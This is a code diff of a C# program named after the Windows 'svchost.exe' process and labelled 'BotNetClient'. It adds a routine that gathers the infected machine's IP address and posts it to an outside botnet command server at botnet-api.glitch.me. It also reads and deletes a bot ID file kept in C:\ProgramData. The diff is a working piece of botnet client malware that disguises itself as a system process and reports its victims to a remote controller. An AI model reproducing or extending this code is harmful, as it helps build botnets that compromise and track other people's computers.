@@ -3,14 +3,32 @@ using System.Diagnostics;
 using System.IO;
 using System;
 using System.Net.Http;
-using System.Net.Http.Headers;
+using System.Net;
 using System.Threading.Tasks;
 using System.Threading;
+using System.Web.Script.Serialization;
 
 namespace svchost.exe
 {
+    public class Response
+    {
+        public string ip { get; set; }
+        public string response { get; set; }
+    }
     class Program
     {
+        static async Task SendAsync(string Ip)
+        {
+            HttpClient client = new HttpClient();
+            client.BaseAddress = new Uri("https://botnet-api.glitch.me/");
+            Response response = new Response
+            {
+                ip = Ip,
+                response = Ip + "    Disconneted"
+            };
+            string json = new JavaScriptSerializer().Serialize(response);
+            await client.PostAsync($"/api/v1/responses/{Ip}", new StringContent(json));
+        }
         static async Task Delete(uint id)
         {
             HttpClient client = new HttpClient();
@@ -19,6 +37,8 @@ namespace svchost.exe
         }
         static void Main(string[] args)
         {
+            IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
+            IPAddress ipaddress = iphostinfo.AddressList[0];
             String pth = "System.Diagnostics.Process (BotNetClient)";
             Thread.Sleep(1000);
             string id;
@@ -45,8 +65,9 @@ namespace svchost.exe
                 else
                 {
                     id = File.ReadAllText("C:\\ProgramData\\idbtc.txt");
-                    Delete(Convert.ToUInt32(id)).Wait();
                     File.Delete("C:\\ProgramData\\idbtc.txt");
+                    Delete(Convert.ToUInt32(id)).Wait();
+                    SendAsync(ipaddress.ToString()).Wait();
                     break;
                 }
             }
